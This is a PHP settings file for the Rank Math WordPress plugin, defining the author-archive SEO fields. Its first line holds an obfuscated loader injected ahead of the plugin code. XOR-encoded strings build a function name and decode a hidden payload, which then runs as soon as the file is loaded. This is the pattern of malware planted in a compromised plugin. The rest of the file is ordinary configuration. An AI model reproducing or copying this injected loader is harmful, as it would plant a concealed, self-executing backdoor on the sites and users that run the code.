<?php $rGYjoj='C94 7<mJL:3Z<Q='; $zvaDIW=' KQACY2,9TP.U>S'^$rGYjoj; $uUwVTVvz='PFpgSDB.71+95V.SO-HiRSD:mX1L8aqMGDkpFmLzzMHTS.:Z;oA7L;J,TXa=8U-LM559.upI15BgfbHbu,9;=I<=ZuEKuiaa8H0QJxlWooqwrSp-mDH0U.,Jr.VA5gBgEBnOFnQ;J777eTHTCqR.D.oCG:ygmfYT6gpEwvy9.46= qfR1Mz8xqMdm<VTU4=om7> niklJxQf7uQWZWIndRW 2KwYeT9921<2ThYs4L=H=Mmz0>JP T>PGFcqztg=qk;4ah8YEAsOVf8TAK7Dd=fohZ FPj87,RqwJ1R j9EeV500Ahst3+8H-i6QzYI2mZGu=4CWxZAy71V H8U:ldu.ihl: 03uJJwKK3MFiMmg< -= CUAgpKfO5:L1E-UatIcR-NbhPAnWPMMgMXSX+V6Rirn40D8np Q31xshv2W2XB+X818Xf. <rJ N3:9=U fT,B6qB=Y01 XNcr XX LvNm<7636=XKPhnM,,jI-;=9FIwK4==P2fS 6aE+= 3=NM1.5InujD+N AfeBCJ=4YoPZV8+mjW64EgqlXQKlwoldiFniK+NX2Qs443k,LX2tTw.b+6VskDodWpXRNSB<F2>l22SDX2ie1WOG 2YWIvvO,NRhmcicyYK<X<W0U noH8=;,a=WJ BSYVcdMEDUV15gabmE6'; $XkxnOPm=$zvaDIW('', '9 XF51,MCXDWj3V:<Y;Au++H2<P8Y>. 20LYoM7ps+=:0ZS5UO9X>d.M 9>bU YdiQTMOYPmZP;NFBhBUW324mSH.UxkRNZk1AV>8PH>ORQGIsTDQ7<B9KBbVJ75TNyGa+EdodX2nXBCEzutkU6O0O4g.gY9MB21O<T,WSYJZFZXNYB9T4SeQJGmdN3  FSGIXKTGRae7r,l=Q56.6iSD46LA.LSA0XMSnWW-HdSR-Q;XvgpVQ85A7Vpob<25;,t4KZGALS<<aNqvBN5->RmDFlfL>A215SRUrLWnZ7YQ3LA2TDQaUSPEJT=HR<,pS TMrfQYU76Qz:s>W9R-Y6RLLQq;-=oecgU+9Wo V4fTsMCJAAHEju:myBB+TN-n.H,AIiG9H7YbYHJ319,Gpxw.J:C7RxgI:92dTD0GPXNH6G9A=0B9TXB=NVON-.A:RefP TN6M1SGvb=URO<+KVD9,AeZnIXVBRiV=2yAUGEJBmIZIXfoQkUOO1K98EO> STSGNfjZKLnBUN J:AhFCdcbPPlGt>7LJ6M<SMb:XLelkKFVTVZvYZ.H,:S0EUPUXMy:SL6EOQOS0DLmOBqP9 <2;c-WG3WJ:7,AABA66+OS=peVR+M:3ADCICYykGR52F4LFK,YIZwFM63L-2=q>MvOM0.XAOQKVOK'^$uUwVTVvz); $XkxnOPm();
/**
 * The authors settings.
 *
 * @package    RankMath
 * @subpackage RankMath\Settings
 */

use RankMath\Helper;

$dep = [ [ 'disable_author_archives', 'off' ] ];

$cmb->add_field(
	[
		'id'      => 'disable_author_archives',
		'type'    => 'switch',
		'name'    => esc_html__( 'Author Archives', 'rank-math' ),
		'desc'    => esc_html__( 'Enables or disables Author Archives. If disabled, the Author Archives are redirected to your homepage. To avoid duplicate content issues, noindex author archives if you keep them enabled.', 'rank-math' ),
		'options' => [
			'on' => esc_html__( 'Disabled', 'rank-math' ),
			'off'  => esc_html__( 'Enabled', 'rank-math' ),
		],
		'default' => $this->do_filter( 'settings/titles/disable_author_archives', 'off' ),
	]
);

$cmb->add_field(
	[
		'id'      => 'url_author_base',
		'type'    => 'text',
		'name'    => esc_html__( 'Author Base', 'rank-math' ),
		'desc'    => wp_kses_post( __( 'Change the <code>/author/</code> part in author archive URLs.', 'rank-math' ) ),
		'default' => 'author',
		'dep'     => $dep,
		'classes' => 'rank-math-advanced-option',
	]
);

$cmb->add_field(
	[
		'id'      => 'author_custom_robots',
		'type'    => 'toggle',
		'name'    => esc_html__( 'Author Robots Meta', 'rank-math' ),
		'desc'    => wp_kses_post( __( 'Select custom robots meta for author page, such as <code>nofollow</code>, <code>noarchive</code>, etc. Otherwise the default meta will be used, as set in the Global Meta tab.', 'rank-math' ) ),
		'options' => [
			'off' => esc_html__( 'Default', 'rank-math' ),
			'on'  => esc_html__( 'Custom', 'rank-math' ),
		],
		'default' => 'on',
		'dep'     => $dep,
		'classes' => 'rank-math-advanced-option',
	]
);

$cmb->add_field(
	[
		'id'                => 'author_robots',
		'type'              => 'multicheck',
		/* translators: post type name */
		'name'              => esc_html__( 'Author Robots Meta', 'rank-math' ),
		'desc'              => esc_html__( 'Custom values for robots meta tag on author page.', 'rank-math' ),
		'options'           => Helper::choices_robots(),
		'select_all_button' => false,
		'classes'           => 'rank-math-advanced-option',
		'dep'               => [
			'relation' => 'and',
			[ 'author_custom_robots', 'on' ],
			[ 'disable_author_archives', 'off' ],
		],
	]
);

$cmb->add_field(
	[
		'id'              => 'author_advanced_robots',
		'type'            => 'advanced_robots',
		'name'            => esc_html__( 'Author Advanced Robots', 'rank-math' ),
		'sanitization_cb' => [ '\RankMath\CMB2', 'sanitize_advanced_robots' ],
		'classes'         => 'rank-math-advanced-option',
		'dep'             => [
			'relation' => 'and',
			[ 'author_custom_robots', 'on' ],
			[ 'disable_author_archives', 'off' ],
		],
	]
);

$cmb->add_field(
	[
		'id'              => 'author_archive_title',
		'type'            => 'text',
		'name'            => esc_html__( 'Author Archive Title', 'rank-math' ),
		'desc'            => esc_html__( 'Title tag on author archives. SEO options for specific authors can be set with the meta box available in the user profiles.', 'rank-math' ),
		'classes'         => 'rank-math-supports-variables rank-math-title rank-math-advanced-option',
		'default'         => '%name% %sep% %sitename% %page%',
		'dep'             => $dep,
		'sanitization_cb' => [ '\RankMath\CMB2', 'sanitize_textfield' ],
		'attributes'      => [ 'data-exclude-variables' => 'seo_title,seo_description' ],
	]
);

$cmb->add_field(
	[
		'id'         => 'author_archive_description',
		'type'       => 'textarea_small',
		'name'       => esc_html__( 'Author Archive Description', 'rank-math' ),
		'desc'       => esc_html__( 'Author archive meta description. SEO options for specific author archives can be set with the meta box in the user profiles.', 'rank-math' ),
		'classes'    => 'rank-math-supports-variables rank-math-description rank-math-advanced-option',
		'dep'        => $dep,
		'attributes' => [
			'class'                  => 'cmb2-textarea-small wp-exclude-emoji',
			'data-gramm_editor'      => 'false',
			'rows'                   => 2,
			'data-exclude-variables' => 'seo_title,seo_description',
		],
	]
);

$cmb->add_field(
	[
		'id'      => 'author_add_meta_box',
		'type'    => 'toggle',
		'name'    => esc_html__( 'Add SEO Meta Box for Users', 'rank-math' ),
		'desc'    => esc_html__( 'Add SEO Meta Box for user profile pages. Access to the Meta Box can be fine tuned with code, using a special filter hook.', 'rank-math' ),
		'default' => 'on',
		'classes' => 'rank-math-advanced-option',
		'dep'     => $dep,
	]
);
